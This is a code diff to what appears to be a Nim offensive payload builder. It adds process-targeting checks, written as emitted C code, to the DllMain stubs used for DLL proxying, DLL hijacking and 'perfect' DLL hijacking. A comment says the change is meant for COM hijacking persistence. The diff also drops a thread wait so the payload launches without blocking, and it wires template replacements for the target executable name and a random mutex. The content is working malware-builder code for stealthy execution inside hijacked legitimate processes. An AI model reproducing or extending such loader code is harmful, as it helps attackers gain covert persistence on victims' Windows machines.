@@ -3053,7 +3053,7 @@ proc execute_in(): bool =
     var exe_name: string = obf("EXENAME")
     if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
         let temp_str = $cast[cstring](temp.addr)
-        if temp_str.contains(exe_name):
+        if temp_str.toLower().contains(exe_name.toLower()):
             return false
     return true
 
@@ -3067,6 +3067,38 @@ import perfecthijack
 
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  # we hardcode this C Code in front of NimMain, because NimMain will LoaderLock some processes that we don't want to target
+  # this is especially needed/usefull for COM Hijacking persistence.
+  when defined(execute_in_proc):
+    {.emit: @@@
+        #include <string.h>
+        #include <ctype.h>
+
+        char temp[MAX_PATH];
+        const char* exe_name = "EXENAME";
+
+        // Case-insensitive strstr implementation
+        const char* strcasestr(const char* haystack, const char* needle) {
+            if (!*needle) return haystack;
+            for (; *haystack; ++haystack) {
+                if (tolower((unsigned char)*haystack) == tolower((unsigned char)*needle)) {
+                    const char* h = haystack, *n = needle;
+                    for (; *h && *n; ++h, ++n) {
+                        if (tolower((unsigned char)*h) != tolower((unsigned char)*n)) break;
+                    }
+                    if (!*n) return haystack;
+                }
+            }
+            return NULL;
+        }
+
+        if (GetModuleFileNameA((HMODULE)0, (LPSTR)temp, (DWORD)(sizeof(temp) / sizeof(temp[0]))) > 0) {
+            const char* temp_str = temp;
+            if (strcasestr(temp_str, exe_name) == NULL) {
+                return 0; // return true and exit DllMain
+            }
+        }
+    @@@.}
   when not defined(payloadFunc):
     NimMain()
 
@@ -3095,6 +3127,36 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
 let DLLHijackStub = """
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  when defined(execute_in_proc):
+    {.emit: @@@
+    #include <string.h>
+        #include <ctype.h>
+
+        char temp[MAX_PATH];
+        const char* exe_name = "EXENAME";
+
+        // Case-insensitive strstr implementation
+        const char* strcasestr(const char* haystack, const char* needle) {
+            if (!*needle) return haystack;
+            for (; *haystack; ++haystack) {
+                if (tolower((unsigned char)*haystack) == tolower((unsigned char)*needle)) {
+                    const char* h = haystack, *n = needle;
+                    for (; *h && *n; ++h, ++n) {
+                        if (tolower((unsigned char)*h) != tolower((unsigned char)*n)) break;
+                    }
+                    if (!*n) return haystack;
+                }
+            }
+            return NULL;
+        }
+
+        if (GetModuleFileNameA((HMODULE)0, (LPSTR)temp, (DWORD)(sizeof(temp) / sizeof(temp[0]))) > 0) {
+            const char* temp_str = temp;
+            if (strcasestr(temp_str, exe_name) == NULL) {
+                return 0; // return true and exit DllMain
+            }
+        }
+    @@@.}
   when not defined(dllexportfuncs):
     when not defined(payloadFunc):
       NimMain()
@@ -3128,6 +3190,36 @@ import dynlib
 proc NimMain() {.cdecl, importc.}
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  when defined(execute_in_proc):
+    {.emit: @@@
+    #include <string.h>
+        #include <ctype.h>
+
+        char temp[MAX_PATH];
+        const char* exe_name = "EXENAME";
+
+        // Case-insensitive strstr implementation
+        const char* strcasestr(const char* haystack, const char* needle) {
+            if (!*needle) return haystack;
+            for (; *haystack; ++haystack) {
+                if (tolower((unsigned char)*haystack) == tolower((unsigned char)*needle)) {
+                    const char* h = haystack, *n = needle;
+                    for (; *h && *n; ++h, ++n) {
+                        if (tolower((unsigned char)*h) != tolower((unsigned char)*n)) break;
+                    }
+                    if (!*n) return haystack;
+                }
+            }
+            return NULL;
+        }
+
+        if (GetModuleFileNameA((HMODULE)0, (LPSTR)temp, (DWORD)(sizeof(temp) / sizeof(temp[0]))) > 0) {
+            const char* temp_str = temp;
+            if (strcasestr(temp_str, exe_name) == NULL) {
+                return 0; // return true and exit DllMain
+            }
+        }
+    @@@.}
   when not defined(payloadFunc):
     NimMain()
   
@@ -3142,7 +3234,6 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
                 lastError = GetLastError()
                 if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
                     var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
-                    WaitForSingleObject(threadHandle, INFINITE)
         else:
             var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
             CloseHandle(threadHandle)
@@ -4421,8 +4512,12 @@ if(dll_out or cpl or xll):
         if(mutexoneshot):
             # replace with random mutex name
             var mutexname = rndStr(8)
-            newDllProxyStub = DLLProxyStub.replace("REPLACEMUTEX", mutexname)
-        stub.add(newDllProxyStub)
+            newDllProxyStub = newDllProxyStub.replace("REPLACEMUTEX", mutexname)
+        if(execute_in_proc):
+            newDllProxyStub = newDllProxyStub.replace("EXENAME", execute_in)
+            stub.add(newDllProxyStub)
+        else:
+            stub.add(newDllProxyStub)
         # if custom payload function not empty, add DllCustomPayloadFuncStub
         if (payloadFunction != ""):
             var NewDllCustomPayloadFuncStub = DllCustomPayloadFuncStub.replace("{payloadFunction}", payloadFunction)
@@ -4435,14 +4530,27 @@ if(dll_out or cpl or xll):
         stub.add(DllStub)
         if(dllhijack):
             if(perfectdllhijack):
-                stub.add(PerfectDLLHijackStub)
+                var tempStub = PerfectDLLHijackStub
+                if(mutexoneshot):
+                    # replace with random mutex name
+                    var mutexname = rndStr(8)
+                    tempStub = tempStub.replace("REPLACEMUTEX", mutexname)
+                if(execute_in_proc):
+                    tempStub = tempStub.replace("EXENAME", execute_in)
+                    stub.add(tempStub)
+                else:
+                    stub.add(tempStub)
             else:
                 var NewDLLHijackStub = DLLHijackStub
                 if(mutexoneshot):
                     # replace with random mutex name
                     var mutexname = rndStr(8)
-                    NewDLLHijackStub = DLLHijackStub.replace("REPLACEMUTEX", mutexname)
-                stub.add(NewDLLHijackStub)
+                    NewDLLHijackStub = NewDLLHijackStub.replace("REPLACEMUTEX", mutexname)
+                if(execute_in_proc):
+                    NewDLLHijackStub = NewDLLHijackStub.replace("EXENAME", execute_in)
+                    stub.add(NewDLLHijackStub)
+                else:
+                    stub.add(NewDLLHijackStub)
     for f in dllexportfunctions:
         stub.add(DllCustomExportStub)
         stub = stub.replace("FUNC_EXPORT", f)
@@ -4543,6 +4651,7 @@ if(dllProxy):
 
 var basicCompileFlags: string = ""
 
+discard exec_cmd_ex("nimgrep \"@@@\" --replace \\\"\\\"\\\" Loader.nim")
 
 if (hellsgate):
     echo "Replacing === with \"\"\" for ASM stubs before compiling:\n"
